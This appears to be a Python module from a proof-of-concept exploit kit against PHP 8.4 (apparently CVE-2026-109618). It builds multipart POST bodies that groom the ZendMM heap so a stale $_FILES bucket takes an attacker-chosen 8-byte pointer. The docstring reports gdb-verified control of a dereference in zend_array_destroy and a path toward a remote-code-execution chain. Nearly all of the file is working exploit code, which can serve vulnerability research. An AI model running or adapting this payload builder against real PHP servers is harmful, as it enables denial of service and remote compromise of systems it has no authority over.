#!/usr/bin/env python3
# INDEX: binary-safe POST-value channel -> stale $_FILES bucket val.value (full 8 bytes, NUL-tolerant) | cli apache fpm
"""Binary-safe value channel for the CVE-2026-109618 stale $_FILES bucket.

The stale-bucket arm (bugs/stale_bucket_groom_crash.py) sources the dispatched
val.value from the file-part INDEX NAME, whose hash-key parse truncates at the
first NUL -- so it can only carry NUL-free (always-faulting) addresses. This
routes val.value from a multipart field VALUE instead: field content is copied
raw up to Content-Length and is NOT NUL-truncated.

Mechanism: pad / flood value fields are filled with 8-byte-periodic S (fill());
the flood fields are duplicated so each 2nd copy frees the 1st floodsz ZendMM
chunk into its free list, and the stale bucket's backing arData is carved from
that recycled region. Whichever 8-aligned window the bucket's zval lands on
gives val.value = S (all 8 bytes, NULs included). Request-shutdown's
zend_array_destroy then dereferences S (GC_DELREF: `subl $1,(S)`), and with a
refcounted-typed record (see unit(), type_info 0x0107 = IS_ARRAY|refcounted)
the rc_dtor_func(S) destructor path is reached.

Stage: VERIFIED (empirical) 8.4.26 `php -S`. Under gdb (ASLR off) the SIGSEGV
in zend_array_destroy has rdi == S for both a NUL-free S (0x1122334455667788)
and a NUL-bearing S (0x00007f4142434400) -- the channel carries the full
8 bytes. Black-box the same arm manifests as a worker-killing crash at an
attacker-chosen val.value. The precise record-to-type-flag interaction at the
landing window is empirical (fill() alone reaches the deref; the full
rc_dtor_func destructor dispatch is exercised by the RCE chain's unit-typed
carrier). The pad window that lands a record under the bucket is heap-state
dependent and is swept by the caller.

API:
    unit(S, type_info=0x0107) -> 16-byte refcounted-typed zval record
    fill(S, size)             -> `size` bytes of 8-byte-periodic S
    seat_body(S, n_pad, ...)  -> multipart wire bytes arming the channel
"""
from __future__ import annotations

import os
import struct
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.multipart import part, terminator, PHP2SHELL_BOUNDARY_B as BND  # noqa: E402

IDX_LEN = 262144        # file-part index-name length: large key -> OOM at its zend_string_init
REFCOUNTED_ARRAY = 0x0107   # type_info: IS_ARRAY(7) | (IS_TYPE_REFCOUNTED<<8)


def unit(S, type_info=REFCOUNTED_ARRAY):
    """One 16-byte zval-shaped record: value=S, u1.type_info, u2=0."""
    return struct.pack("<Q", S) + struct.pack("<I", type_info) + b"\x00\x00\x00\x00"


def fill(S, size):
    """`size` bytes of 8-byte-periodic S (any 8-aligned window -> value=S)."""
    return (struct.pack("<Q", S) * (size // 8 + 1))[:size]


def seat_body(S, n_pad, padsz=16384, nflood=50, floodsz=288, seat=b"s",
              idx_len=IDX_LEN, fav=None):
    """Arm the stale bucket so its val.value is carved from a binary-safe field.

    Layout: optional live `fav` $_POST value (the RCE carrier, placed first so
    its persistent buffer can occupy S) -> `n_pad` unit-filled pad fields
    (calibrate where the OOM crosses) -> `nflood` duplicate unit-filled field
    pairs (each 2nd frees the 1st floodsz-chunk into its bin) -> short seat file
    part u[seat][k] (so `u` is not STATIC_KEYS) -> deadly file part whose
    oversized index name OOMs at its key, leaving the counted bucket stale.
    """
    c = []
    if fav is not None:
        c.append(part(b"fav", fav, boundary=BND))
    pv = fill(S, padsz)
    for i in range(n_pad):
        c.append(part(b"p%d" % i, pv, boundary=BND))
    fv = fill(S, floodsz)
    for j in range(nflood):
        c.append(part(b"f%d" % j, fv, boundary=BND))
        c.append(part(b"f%d" % j, fv, boundary=BND))
    c.append(part(b"u[" + seat + b"][k]", b"x", filename="f.txt",
                  ctype="text/plain", boundary=BND))
    c.append(part(b"u[" + b"D" * idx_len + b"][k]", b"y", filename="g.txt",
                  ctype="text/plain", boundary=BND))
    c.append(terminator(BND))
    return b"".join(c)
